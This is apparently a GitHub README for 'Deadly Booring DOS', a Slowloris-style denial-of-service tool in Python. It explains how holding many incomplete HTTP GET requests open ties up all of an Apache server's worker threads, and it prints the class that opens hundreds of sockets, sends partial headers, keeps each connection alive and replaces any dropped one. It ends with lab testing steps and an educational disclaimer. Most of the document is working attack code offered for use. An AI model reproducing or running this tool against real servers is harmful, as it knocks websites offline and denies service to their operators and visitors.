# Deadly Booring DOS

Denial of Service attacks do not always have to flood the server with requests to make him shut down. Deadly Booring DOS takes a much more elegant appraoch: Instead sending as much data as possible, we send as little data as we can. 
DeadlyBooring is a free interpretation of SlowLoris DOS.

### *Preface*
Deadly Booring DOS was purely written for educational researches. I am going to explain how you can set up a simple appache website on one of your old machines that you can use to test DeadlyBooring. Never run such an attack against IP addresses that are not under your control. Never abuse the script to harm anybody. You got your own responsibility.

# The Idea
DeadlyBoorig DOS looks at DOS attacks from a different perspective. To understand how it works, we first need to understand internet protocols in general. What our browser is doing when we enter *http://www.github.com* is sending a HTTP GET Request to the IP address of the github servers (which is *192.30.253.113*, by the way) to the port 80, which is usually used to serve HTTP Requests. Such a HTTP GET request may say *"Please give me the /joelbarmettlerUZH/DeadlyBooring_DOS site"*, to which the github servers will respond with the corresponding HTML file. 

## HTTP GET Requests

The normal usage of such GET requests is to just type an URL into your browser, which then asks the DNS server to convert github.com into an IP and formulates the right GET request for all the content that needs to be displayed, such as images and scripts. The browser asks for data - the server responds - done. 

The interesting thing is that such HTTP GET requests follow a well defined schema: They start with the content the browser is asking for, followed by the used Protocol *(HTTP/1.1)*, ended with two line-break characters \n\n. As long as the server does not retreive these two newline characters, he is waiting for more data to come, thinking the browser has a temporary internet loss or simply a slow connection. Eventually, when the server does not hear anything from the browser for a bunch of seconds, he drops the connection to the browser again. This is quiet a normal behaviour. 

## Apache Servers
DeadlyBooring DOS is now making use of this server behaviours: Most of the internet servers (arround 50%) run on apache, an open source HTTP Server Project. Appache is built in a way that the server opens a new Thread for every user that is requesting content, answering his requests until it is done. A small server only has a limited amount of such threads he can have opened simultaniously - meaning he can only serve a limited amount of users at once. Normally, this is no problem at all, since small websites rarely have several hundret users that want to make a request to the werbserver in the same second. What DeadlyBooring DOS does is opening up connections to all threads on the appache webserver and making an unfinished HTTP GET Request every few seconds, which makes the thread wait for more data and therefore prevents the webserver from closing the connection. This means that we pretend to be several hundret users with a deadly slow internet connection, making the whole server wait for data to come, but we will never finish sending our incomplete requests every few seconds. 

While the server has all its threads dedicated to our script, the webserver will not answer any other GET requests from other users, since he is busy waiting for our nonsense data. Meanwhile, our computer barely needs any computing power since all we do is sending several hundrets tiny small data packages to a server every second - which is by no means a task you would even recognize running in your background. 

# The Code
The code is fairly simple and just under 50 lines. First, we create the DeadlyBooring class and provide it with information about to what IP we would like to lead our attack to, as well as the Port (80 is the standard port for webserver) and the number of parallel connections that we want to establish. Lastly, we fake some HTTP GET header information to make our requests plausible to the server.

```python
class DeadlyBooring():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
```

## Create sockets

Next, we want to create our sockets. We define a method that connects a new websocket with the dedicated protocol types to the IP and Port that we specified. We send him a first GET request and the HTTP header information. Some error handling ensures that an error would not lead the DOS to stop but would just try creating a new socket instead.

```python
    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()
```

Now we just have to create a list with a few hundrets of such sockets that we can then use for our DOS attack.

```python
self._sockets = [self.newSocket() for _ in range(socketsCount)]
```

## Attack-method
Now let's finally write the attack method. It is actually really simple: For all sockets, we send a get request with the *X-a* header field, keeping the request open and making the server wait for the rest of the data. After each sent request, we wait vor a short period of time before sending the next one, with making sure that every socket sends data at least once every couple of seconds so that the connection is not lost. Every lost socket is immediatelly replaced with a new one taking its place, guaranteeing that free server threads are populated again. 

```python    
    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))
```

# Testing
In order to test our code, we need to create a protected environment, since we can not just start a DOS attack on some server that we do not own. As a simple option, you can use some old hardware and run [wamp](http://www.wampserver.com/en/) on it. Install and run WAMPServer on your second device and test the connection by visiting [localhost:80](localhost:80), which should give you the default wamp interface, indicating that your server is running. If you want to go fancy, create a simple HTML file in the *www* directory where you installed whamp. Now open the command promt on your second device and run 
```sh
ipconfig
```
which will give you your local IP-Address (lets assume here that the devices IP is 192.168.0.33). Test the connection to your second device via typing "192.168.0.33:80" into your browser, letting you directly access the webpage you created on your second device. If you see nothing, make sure both devices are connected to the same router, your WAMP is running and no firewall is blocking the access. Otherwise, make sure that in the WAMP httpd_config file, you set the restrictions to LOCAL (google for further instructions). If it works, try calling DeadlyBooring on the same IP on Port 80. Refresh your page and you will see that you will get no response from the server (note that the website may be cashed, so you will sill see the page). 

License
----

MIT License

Copyright (c) 2018 Joel Barmettler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Hire us: [Software Entwickler in Zürich](https://polygon-software.ch)!
